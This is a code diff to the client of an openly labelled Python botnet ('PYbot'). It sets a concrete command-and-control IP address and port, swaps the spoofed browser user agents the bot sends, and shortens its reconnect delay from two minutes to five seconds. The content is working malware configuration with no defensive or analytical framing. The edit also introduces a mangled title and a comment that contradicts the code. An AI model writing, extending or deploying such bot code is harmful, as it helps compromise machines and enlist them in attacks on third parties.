@@ -1,4 +1,4 @@
-# PYbot - A simple Python3 botnet
+# PYbot - A simple Python botnet3
 # Author: 
 # Date: 
 # Bot
@@ -9,15 +9,11 @@ import time
 import random
 
 # Configuration
-C2_ADDRESS  = '185.84.160.130'
+C2_ADDRESS  = '185.84.160.186'
 C2_PORT     = 9999
 
 base_user_agents = [
-    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
-    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
-    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
-    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
-    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
 ]
 
 def rand_ua():
@@ -88,7 +84,7 @@ def main():
 
             break
         except:
-            time.sleep(120) # retry in 2 mins if connection fails
+            time.sleep(5) # retry in 1 mins if connection fails
 
     while 1:
         try:
